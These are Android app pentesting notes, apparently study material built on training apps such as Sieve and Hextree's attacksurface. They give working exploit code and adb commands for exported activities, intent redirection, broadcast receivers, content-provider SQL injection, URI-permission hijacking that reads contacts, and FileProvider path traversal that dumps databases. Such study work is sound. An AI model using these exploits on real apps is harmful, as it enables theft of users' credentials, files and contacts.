# Content
- [Exported Actvites](#exported-actvites)
  - [Exported Actvites with Extras](#exported-actvites-with-extras)
  - [Exported Actvites with Return](#exported-actvites-with-return)
  - [Intent Redirect](#intent-redirect)
- [Broadcastreceiver](#broadcastreceiver)
- [ContentProvider](#contentprovider)

# Exported Actvites
exported actvites can lead to see senstive info also can lead to open another actvites and more functions which maybe danger if anyone can do that
## How to find ? 
### in `AndroidManifest.xml`
- search for  `android:exported="true"` in an activity
- before android 12 if an activity has an `intent-filter` declared in the manifest, Android automatically considers the activity as exported, even if you don't explicitly set `exported="true"`

```xml
<intent-filter>
  <action android:name="android.intent.action.MAIN"/>
  <category android:name="android.intent.category.LAUNCHER"/>
</intent-filter>
```

### open activity using shell
```powershell
am start-activity -n <package name>/.<activity name>
am start-activity -n com.mwr.example.sieve/.FileSelectActivity
```

### open activity by another app
```java
Intent I =  new Intent();
ComponentName C = new ComponentName("<app package name>", "<activity name>");
I.setComponent(C);
startActivity(I);

// example
Intent I =  new Intent();
ComponentName C = new ComponentName("com.mwr.example.sieve", "com.mwr.example.sieve.PWList");
I.setComponent(C);
startActivity(I);

// other way
Intent intent = new Intent();
intent.setClassName("io.hextree.activitiestest", "io.hextree.activitiestest.SecondActivity");
startActivity(intent);
```


## Exported Actvites with Extras
sometimes we can send an intent with some data if we have a code like the following and if the activity is exported then we can conrtol the data sent to it  



- java code
```java
Intent intent = getIntent();
username = intent.getStringExtra("username");
```
- AndoridMainfest
```xml
<activity android:name=".ChangePin" android:exported="true">
  <intent-filter>
    <action android:name="com.apphacking.changePin"/>
    <category android:name="android.intent.category.DEFAULT"/>
  </intent-filter>
</activity>
```

### open activity and use Extras in shell
```powershell
# explicit intent is an intent to specfic app
am start-activity -n <package name>/.<activity name> --es "paramter" "value"
am start-activity -n com.apphacking.alarmpin/.ChangePin --es "paramter" "value"

# implicit intent is an intent to be recived by appropiate apps
am start-activity -a <intent action name> --es "paramter" "value"
am start-activity -a <intent action name> -c <intent category name> --es "paramter" "value"

am start-activity -a com.apphacking.changePin  --es "username" "hacked"
am start-activity -a com.apphacking.changePin -c android.intent.category.DEFAULT  --es "username" "fuck"
```

### open activity and use Extras in another app
```java
// explicit intent
Intent I = new Intent();
ComponentName C = new ComponentName("<app package name>", "<activity name>");
I.setComponent(C);
I.putExtra("paramter", "value");
startActivity(I);

// example
Intent I = new Intent();
ComponentName C = new ComponentName("com.apphacking.alarmpin", "com.apphacking.alarmpin.ChangePin");
I.setComponent(C);
I.putExtra("username", "fucker");
startActivity(I);

// implicit intent
Intent I = new Intent();
I.setAction("<intent action name>"); 
I.addCategory(<intent category name>);  
I.putExtra("paramter", "value");        
startActivity(intent); 

// example
Intent intent = new Intent();
I.setAction("com.apphacking.changePin"); 
I.addCategory(Intent.CATEGORY_DEFAULT); 
I.putExtra("username", "fuck");         
startActivity(intent); 
```

### Send Data Uri

```java
Intent I =  new Intent();
ComponentName C = new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag3Activity");
I.setComponent(C);
I.setAction("io.hextree.action.GIVE_FLAG");
I.addCategory(Intent.CATEGORY_DEFAULT);
Uri dataUri = Uri.parse("https://app.hextree.io/map/android");
I.setData(dataUri);
startActivity(I);


// another exmaple

 Intent intent = new Intent();
 intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag1Activity"));
 String name = "Kyrillos";
 Uri data = Uri.parse("custom://data?name=" + name);
 intent.setData(data);
 startActivity(intent);
```

## Exported Actvites with Return
Starting activities is not just a one-way communication. Activities can also return a result back to the caller when it was started with `startActivityForResult()` or `ActivityResultLauncher`.

> Note: startActivityForResult is decpracted

**Vuln APP**
```java
ComponentName callingActivity = getCallingActivity();
if (callingActivity == null || !callingActivity.getClassName().contains("Hextree")) {
    return;
}
Intent intent = new Intent("flag");
this.f.addTag(intent);
this.f.addTag(42);
intent.putExtra("flag", this.f.appendLog(this.flag));
setResult(-1, intent);
finish();
success(this);
```
**Exploit APP**
```java
Intent I =  new Intent();
I.setComponent(new ComponentName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag9Activity"));

ActivityResultLauncher<Intent> launcher = registerForActivityResult(
        new ActivityResultContracts.StartActivityForResult(),
        result -> {
            if (result.getResultCode() == RESULT_OK) {
                String flag = result.getData().getStringExtra("flag");
                mainTextView.setText(flag);
            }
        }
);
launcher.launch(I);
```

## Intent Redirect
- The "Intent Redirect" vulnerability class is pretty simple. It means an attacker can control the intent used by the other app to for example start an activity even if it is not exported
- The Attacker's intent run with the permssion level of the Victim App
**Vuln APP**
```java
Intent intent = getIntent();
Intent intent2 = (Intent) intent.getParcelableExtra("android.intent.extra.INTENT");
if (intent2 == null || intent2.getIntExtra("return", -1) != 42) {
    return;
}
this.f.addTag(42);
Intent intent3 = (Intent) intent2.getParcelableExtra("nextIntent");
this.nextIntent = intent3;
if (intent3 == null || intent3.getStringExtra("reason") == null) {
    return;
}
this.f.addTag("nextIntent");
if (this.nextIntent.getStringExtra("reason").equals("back")) {
    this.f.addTag(this.nextIntent.getStringExtra("reason"));
    success(this);
} else if (this.nextIntent.getStringExtra("reason").equals("next")) {
    intent.replaceExtras(new Bundle());
    startActivity(this.nextIntent);
}

```
**Exploit APP**
```java
Intent I3 = new Intent();
I3.setComponent(new ComponentName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag6Activity"));
I3.putExtra("reason","next");
I3.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
Intent I2 = new Intent();
I2.putExtra("return",42);
I2.putExtra("nextIntent",I3) ;
Intent I1 = new Intent();
I1.setComponent(new ComponentName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag5Activity"));
I1.putExtra("android.intent.extra.INTENT",I2);
this.startActivity(I1);
```



# Broadcastreceiver
we can search for broadcastreceivers like the follwoing and we can send an intents to it and controls the data 


- declartion of BroadcastReceiver
```java
public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(myReceiver, new IntentFilter("com.apphacking.broadcastreceiver.MyCustomReceiver"), Context.RECEIVER_EXPORTED);
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            // On Android 12 and above, but below Android 13
            registerReceiver(myReceiver, new IntentFilter("com.apphacking.broadcastreceiver.MyCustomReceiver"), Context.RECEIVER_NOT_EXPORTED);
        } else {
            // For Android 11 and below
            registerReceiver(myReceiver, new IntentFilter("com.apphacking.broadcastreceiver.MyCustomReceiver"));
        }
    }
    final private BroadcastReceiver myReceiver =  new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            Log.d("WTF","********************");
            Log.d("WTF", "I recived something");
            Log.d("WTF","********************");
        }
    };
}
```

- sending intent in adb shell 
```shell
am broadcast -a <broadcastreceiver name>
am broadcast -a <broadcastreceiver name> --es "param" "value"

am broadcast -a com.apphacking.broadcastreceiver.MyCustomReceiver2 
am broadcast -a com.apphacking.broadcastreceiver.MyCustomReceiver2 --es "msg" "hacked"
```

- sending intent in another app
```java
public void sendToBroadCast(){
        Intent intent =  new Intent() ;
        intent.setAction("com.apphacking.broadcastreceiver.MyCustomReceiver");
        intent.putExtra("msg","hacked");
        sendBroadcast(intent);
    }
```

### Android 8 and before BroadcastReceivers was declared in AndroidManifest
- AndroidManifest
```xml
        <receiver
            android:name=".SaveData"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BATTERY_LOW" />
            </intent-filter>
        </receiver>

```
- java code
```java
public class SaveData extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {

        // Battery is running low!
        System.out.println("###############################");
        System.out.println("           Save Data !         ");
        System.out.println("###############################");
    }
}
```

# ContentProvider
- A Content Provider is a data-sharing API layer that lets apps safely expose or consume structured data.
- It can be exported and protected by permissions in the manifest or dynamically in the code.
- ContentProvider that is exported to external world can be vuln to SQLi.
- Android 11+ hides most of the installed-app list by default for privacy. If your app needs to detect or interact with specific other apps, you must declare them in `<queries>` so `queryIntentActivities()` / `getInstalledPackages()` etc. return those apps for you

### ContentProvider Declration
- AndroidManifest Example 
```xml
<provider android:name=".DBContentProvider" android:exported="true" android:multiprocess="true" android:authorities="com.mwr.example.sieve.DBContentProvider">
  <path-permission android:readPermission="com.mwr.example.sieve.READ_KEYS" android:writePermission="com.mwr.example.sieve.WRITE_KEYS" android:path="/Keys"/>
</provider>
<provider android:name=".FileBackupProvider" android:exported="true" android:multiprocess="true" android:authorities="com.mwr.example.sieve.FileBackupProvider"/>
```
- java class from AndroidManifest that extends ContentProvider
```java
public class DBContentProvider extends ContentProvider
```
- intent pemrssion content provider
```xml
<provider
android:name="io.hextree.attacksurface.providers.Flag33Provider1"
android:enabled="true"
android:exported="false"
android:authorities="io.hextree.flag33_1"
android:grantUriPermissions="true"/>

<activity
android:name="io.hextree.attacksurface.activities.Flag33Activity1"
android:exported="true">
  <intent-filter>
    <action android:name="io.hextree.FLAG33"/>
  </intent-filter>
</activity>
```
```java
intent.setData(Uri.parse("content://io.hextree.flag33_1/flags"));
intent.addFlags(1); // public static final int FLAG_GRANT_READ_URI_PERMISSION = 1; public static final int FLAG_GRANT_WRITE_URI_PERMISSION = 2;
setResult(-1, intent);
finish();

```

## SQLi 
in DBContentProvider class this query function lacks validation so it can be exolited by SQLi
```java
    @Override // android.content.ContentProvider
    public Cursor query(Uri in, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
        int type = this.sUriMatcher.match(in);
        SQLiteQueryBuilder queryBuilder = new SQLiteQueryBuilder();
        if (type >= 100 && type < 200) {
            queryBuilder.setTables(PWTable.TABLE_NAME);
        } else if (type >= 200) {
            queryBuilder.setTables(PWTable.KEY_TABLE_NAME);
        }
        return queryBuilder.query(this.pwdb.getReadableDatabase(), projection, selection, selectionArgs, null, null, sortOrder);
    }
```

### from adb shell
```shell
content query  --uri <content URI>  --projection <Payload>
content query  --uri content://com.mwr.example.sieve.DBContentProvider/Passwords  --projection "* from Key -- - "
```
### form another android app
- java class
```java
TextView textView = findViewById(R.id.text);
Uri uri = Uri.parse("<content URI>") ;
try {
  String [] projection = new String[] {"<Payload>"} ;
  Cursor cursor = getContentResolver().query(uri, projection , null, null, null) ;
  textView.setText(DatabaseUtils.dumpCursorToString(cursor));
}catch (Exception e){
  textView.setText(e.toString());
}


// example
TextView textView = findViewById(R.id.text);
Uri uri = Uri.parse("content://com.mwr.example.sieve.DBContentProvider/Passwords") ;
try {
  String [] projection = new String[] {"* from Key -- -"} ;
  Cursor cursor = getContentResolver().query(uri, projection , null, null, null) ;
  textView.setText(DatabaseUtils.dumpCursorToString(cursor));
}catch (Exception e){
  textView.setText(e.toString());
}
```
- AndroidManifest
```xml
<queries>
  <package android:name="<Package name to attack>" ></package>
</queries>
```

### from another app against intent content provider
```java

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        
        TextView textView = findViewById(R.id.text);
        Intent intent = new Intent("io.hextree.FLAG33");
        intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag33Activity1");
        startActivityForResult(intent, 1);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {

        TextView textView = findViewById(R.id.text);
        Uri uri = data.getData();

        try {
            String[] projection = new String[]{"title, content,1 from Note -- "} ;
            Cursor cursor = getContentResolver().query(uri, projection, null, null, null);
            textView.setText(DatabaseUtils.dumpCursorToString(cursor));
        } catch (Exception e) {
            textView.setText(e.toString());
        }


    }
```

## Hijacking Content Provider Access
- While apps can intentionally share access to Content Providers, sometimes apps can also be forced to do it unintentionally.
- the following code is vuln to intent rediection we can send an intent to it , then it will redirect it as if it send it
```java
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        Log.i("Process", "id in stealing flag 8: " + Process.myPid());
        this.f182f = new LogHelper(this);
        ComponentName callingActivity = getCallingActivity();
        if (callingActivity != null) {
            if (callingActivity.getClassName().contains("Hextree")) {
                this.f182f.addTag("calling class contains 'Hextree'");
                success(this);
            } else {
                Log.i("Flag8", "access denied");
                setResult(0, getIntent());
            }
        }
    }

```
- this can be exploited to pass content provider permssions to our selves
- also if the vuln app has permssions to other content providers such as contacts we can use it
```java
@Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);

        TextView textView = findViewById(R.id.text);
        Intent intent = new Intent("");
        intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag8Activity");
        intent.setData(Uri.parse("content://com.android.contacts/raw_contacts"));
        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        startActivityForResult(intent, 1);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        TextView textView = findViewById(R.id.text);
        Uri uri = data.getData();

        try {
            Cursor cursor = getContentResolver().query(uri, null, null, null, null);
            textView.setText(DatabaseUtils.dumpCursorToString(cursor));
        } catch (Exception e) {
            textView.setText(e.toString());
        }

    }
```

# FileProvider


## Declration
- AndroidManifest 
```
        <provider
            android:name="androidx.core.content.FileProvider"
            android:exported="true"
            android:authorities="io.hextree.files"
            <meta-data
                android:name="android.support.FILE_PROVIDER_PATHS"
                android:resource="@xml/filepaths"/>
        </provider>

```
- file provider dynamic access 
```
        <provider
            android:name="androidx.core.content.FileProvider"
            android:exported="false"
            android:authorities="io.hextree.files"
            android:grantUriPermissions="true">
            <meta-data
                android:name="android.support.FILE_PROVIDER_PATHS"
                android:resource="@xml/filepaths"/>
        </provider>

```
- android code
```java
    protected void onCreate(Bundle bundle) throws IOException {
        super.onCreate(bundle);
        String stringExtra = getIntent().getStringExtra("filename");
        if (stringExtra != null) {
            prepareFlag(this, stringExtra);
            Uri uriForFile = FileProvider.getUriForFile(this, "io.hextree.files", new File(getFilesDir(), stringExtra));
            Intent intent = new Intent();
            intent.setData(uriForFile);
            intent.addFlags(3);
            setResult(0, intent);
            return;
        }
        Uri uriForFile2 = FileProvider.getUriForFile(this, "io.hextree.files", new File(getFilesDir(), "secret.txt"));
        Intent intent2 = new Intent();
        intent2.setData(uriForFile2);
        intent2.addFlags(3);
        setResult(-1, intent2);
    }

```
## LFI 
in FileBackupProvider the openFile lacks validation so it can be exolited by LFI 
```java
    @Override // android.content.ContentProvider
    public ParcelFileDescriptor openFile(Uri uri, String mode) {
        int modeCode;
        if (mode.equals("r")) {
            modeCode = 268435456;
        } else if (mode.equals("rw")) {
            modeCode = 805306368;
        } else if (mode.equals("rwt")) {
            modeCode = 805306368;
        } else {
            Log.w(TAG, "Unrecognised code to open file: " + mode);
            return null;
        }
        try {
            return ParcelFileDescriptor.open(new File(uri.getPath()), modeCode);
        } catch (FileNotFoundException e) {
            Log.e(TAG, "ERROR: unable to open file: " + e.getMessage());
            return null;
        }
    }
```
### from adb shell
```shell
content read --uri content://com.mwr.example.sieve.FileBackupProvider/../../../../../../../../../data/data/com.mwr.example.sieve/databases/database.db | base64 -w 0  
```

### from another app
- java class
```java
TextView textView = findViewById(R.id.text);
        Uri uri = Uri.parse("content://com.mwr.example.sieve.FileBackupProvider/../../../../../../../../../data/data/com.mwr.example.sieve/databases/database.db") ;
        try {
            InputStream inputStream = getContentResolver().openInputStream(uri);
            InputStreamReader streamReader =  new InputStreamReader(inputStream);
            BufferedReader bufferedReader =  new BufferedReader(streamReader);
            String file = "";
            while (bufferedReader.ready()){
                file += bufferedReader.readLine();
                file += "\n";
            }
            textView.setText(file);
        }catch (Exception e){
            textView.setText(e.toString());
        }
```
- AndroidManifest
```xml
<queries>
  <package android:name="<Package name to attack>" ></package>
</queries>
```
